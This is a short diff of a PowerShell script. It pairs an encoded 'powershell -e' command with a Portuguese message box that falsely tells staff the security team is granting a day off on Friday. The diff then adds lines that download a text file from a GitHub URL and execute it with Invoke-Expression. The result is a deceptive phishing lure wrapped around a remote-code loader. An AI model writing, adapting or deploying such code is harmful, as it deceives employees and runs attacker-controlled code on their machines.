@@ -2,3 +2,8 @@ powershell.exe -e CgAKACQAdQByAGwAIAA9ACAAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AG
 
 
 Add-Type -AssemblyName PresentationCore,PresentationFramework; [System.Windows.MessageBox]::show('Devido ao grande trabalho da equipe de SEC, estamos ofertando uma folga para toda equipe nexta sexta-feira (09/05/2024), caso esteja de acordo clique em OK.' , 'Atenção',0,32)
+
+
+$url = "https://github.com/iskww/atlasgov/raw/main/support.txt"
+$Content = (Invoke-WebRequest -Uri $url).Content
+Invoke-Expression($Content);
